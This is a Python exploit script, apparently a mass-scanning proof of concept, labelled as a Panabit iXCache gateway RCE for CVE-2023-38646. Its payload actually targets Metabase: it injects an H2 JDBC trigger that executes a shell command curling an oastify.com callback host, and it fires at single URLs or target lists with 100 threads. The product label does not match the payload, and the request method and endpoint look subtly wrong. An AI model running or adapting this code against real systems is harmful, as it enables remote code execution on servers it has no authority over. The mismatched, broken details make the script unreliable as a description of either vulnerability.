
#导包
import requests,re,json,argparse,sys
from multiprocessing.dummy import Pool
#关闭警告
requests.packages.urllib3.disable_warnings()
#横幅
def banner():
    test = """ 
      _____                  _     _ _     ___   _______           _          
 |  __ \                | |   (_) |   (_) \ / / ____|         | |         
 | |__) |_ _ _ __   __ _| |__  _| |_   _ \ V / |     __ _  ___| |__   ___ 
 |  ___/ _` | '_ \ / _` | '_ \| | __| | | > <| |    / _` |/ __| '_ \ / _ \
 | |  | (_| | | | | (_| | |_) | | |_  | |/ . \ |___| (_| | (__| | | |  __/
 |_|   \__,_|_| |_|\__,_|_.__/|_|\__| |_/_/ \_\_____\__,_|\___|_| |_|\___|
                                                                          
                                                                          

   
        
"""
    print(test)
#主函数
def main():
    banner()
    parser = argparse.ArgumentParser(description="Panabit iXCache网关RCE漏洞CVE-2023-38646")
    parser.add_argument('-u','--url',dest='url',type=str,help='url')
    parser.add_argument('-f','--file',dest='file',type=str,help='file')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")




#poc函数
def poc(target):
    payload = '/api/session/properties'
    headers = {
        'Content-Type': 'application/json',
        'Content-Length': '812'
            }
    data = {
    "token": "e56e2c0f-71bf-4e15-9879-d964f319be69",
    "details":
    {
        "is_on_demand": 'false',
        "is_full_sync": 'false',
        "is_sample": 'false',
        "cache_ttl": 'null',
        "refingerprint": 'false',
        "auto_run_queries": 'true',
        "schedules":
        {},
        "details":
        {
            "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('curl qxr35jup1ud9kdfl4qa9lp2gf7ly9oxd.oastify.com')\n$$--=x",
            "advanced-options": 'false',
            "ssl": 'true'
        },
        "name": "rcs-team",
        "engine": "h2"
    }
}
    try:
        res = requests.get(url=target + payload,verify=False,headers=headers,json=data)
        print(res.status_code)
        
        
    except:
        pass
    
    
#函数入口
if __name__ == '__main__':
    main()
